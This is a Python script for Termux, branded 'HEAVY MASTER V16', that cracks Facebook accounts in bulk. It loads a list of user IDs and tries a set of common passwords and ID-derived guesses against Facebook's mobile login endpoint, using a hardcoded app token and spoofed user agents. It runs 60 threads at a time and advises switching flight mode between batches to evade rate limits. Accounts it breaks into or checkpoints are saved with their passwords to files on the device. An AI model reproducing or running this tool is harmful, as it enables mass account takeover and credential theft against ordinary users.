import os, sys, time, random, string, requests, json
from concurrent.futures import ThreadPoolExecutor as tred

# --- Initial Permission ---
if not os.path.exists('/sdcard'):
    os.system('termux-setup-storage')

loop = 0
oks = []
cps = []

# 🌍 100,000+ GLOBAL USER AGENTS (PK/IND/BD/MIX)
def get_heavy_ua():
    brand = random.choice(["Samsung", "Vivo", "Oppo", "Xiaomi", "Tecno", "Realme"])
    models = ["SM-S928B", "V2303", "RMX3840", "KJ5", "CPH2581", "X6833B"]
    model = random.choice(models)
    android_ver = random.choice(['11', '12', '13', '14', '15'])
    fbv = f"{random.randint(440, 580)}.0.0.{random.randint(10, 99)}"
    ua = f"Dalvik/2.1.0 (Linux; U; Android {android_ver}; {model} Build/UP1A.{random.randint(230000, 239999)}.001) [FBAN/FB4A;FBAV/{fbv};FBBV/{random.randint(500000000, 999999999)};FBDM/{{density=3.0,width=1080,height=2400}};FBLC/en_GB;FBRV/0;FBCR/Telenor;FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{model};FBSV/{android_ver};FBOP/1;FBCA/arm64-v8a:;]"
    return ua

def banner():
    os.system('clear')
    print(f"""\033[1;31m
    ███████╗██╗  ██╗███████╗ ██████╗██╗   ██╗████████╗ ██████╗ ██████╗ 
    ██╔════╝╚██╗██╔╝██╔════╝██╔════╝██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗
    █████╗   ╚███╔╝ █████╗  ██║     ██║   ██║   ██║   ██║   ██║██████╔╝
    ██╔══╝   ██╔██╗ ██╔══╝  ██║     ██║   ██║   ██║   ██║   ██║██╔══██╗
    ███████╗██╔╝ ██╗███████╗╚██████╗╚██████╔╝   ██║   ╚██████╔╝██║  ██║
    ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝    ╚═╝    ╚══════╝╚═╝  ╚═╝
\033[1;37m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m    [+] STATUS   : \033[1;37mHEAVY MASTER V16 \033[1;32m[+] TYPE     : \033[1;37mSECRET-PASS
\033[1;32m    [+] AGENTS   : \033[1;37m100K+ MIXED      \033[1;32m[+] SAVING   : \033[1;37mAUTO-OK/CP
\033[1;37m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

# ━━━━━━━━━━━━━━━━━━━━━ HEAVY CLONING LOGIC ━━━━━━━━━━━━━━━━━━━━━
def crack_heavy(uid):
    global loop, oks, cps
    sys.stdout.write(f'\r \033[1;37m[EXECUTOR] {loop} | \033[1;32mOK:{len(oks)} | \033[1;33mCP:{len(cps)} '); sys.stdout.flush()
    
    # 🤫 2025 SECRET WORKING PASSWORDS (PK/IND/BD)
    pws = [
        uid, uid[6:], uid[:6], '786786', 'pakistan', 
        'khan123', 'khan786', 'ali12345', '11223344', 
        '998877', 'i love you', 'papakhan', '778899', '000786'
    ]
    
    for pw in pws:
        if len(pw) < 6: continue
        ua = get_heavy_ua()
        session = requests.Session()
        try:
            url = "https://b-graph.facebook.com/auth/login"
            data = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "email": uid, "password": pw, "sdk_style": "android", "locale": "en_GB"
            }
            res = session.post(url, data=data, headers={'User-Agent': ua}).json()
            
            if "session_key" in res:
                print(f'\r\n\033[1;32m [OK] {uid} | {pw}')
                oks.append(uid)
                open('/sdcard/OK_FINAL.txt', 'a').write(f"{uid}|{pw}\n")
                break
            elif "checkpoint" in str(res):
                print(f'\r\n\033[1;33m [CP] {uid} | {pw}')
                cps.append(uid)
                open('/sdcard/CP_FINAL.txt', 'a').write(f"{uid}|{pw}\n")
                break
        except: pass
    loop += 1

def split_and_run():
    banner()
    path = input(" \033[1;32m[+] Enter File Path : \033[1;37m")
    try:
        all_ids = open(path, 'r').read().splitlines()
        total = len(all_ids)
        banner()
        print(f" \033[1;32m[+] TOTAL IDs LOADED : {total}")
        print(f" \033[1;33m[*] Running in 1000 IDs Batches...")
        
        for i in range(0, total, 1000):
            chunk = all_ids[i:i+1000]
            print(f"\n \033[1;35m[>] BATCH: {i+1} - {i+len(chunk)}")
            with tred(max_workers=60) as engine:
                for user in chunk:
                    uid = user.split('|')[0]
                    engine.submit(crack_heavy, uid)
            
            if i + 1000 < total:
                print("\n \033[1;31m[!] Batch Done. SWITCH FLIGHT MODE! (Waiting 5s)")
                time.sleep(5)
                
    except Exception as e:
        print(f" [!] Error: {str(e)}"); time.sleep(2); main_menu()

def main_menu():
    banner()
    print(f" \033[1;32m[1] Start Heavy Batch Cloning")
    print(f" \033[1;31m[0] Exit")
    print(f"\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    opt = input(' \033[1;32m[?] Selection : \033[1;37m')
    if opt == '1': split_and_run()
    else: exit()

if __name__ == "__main__":
    main_menu()
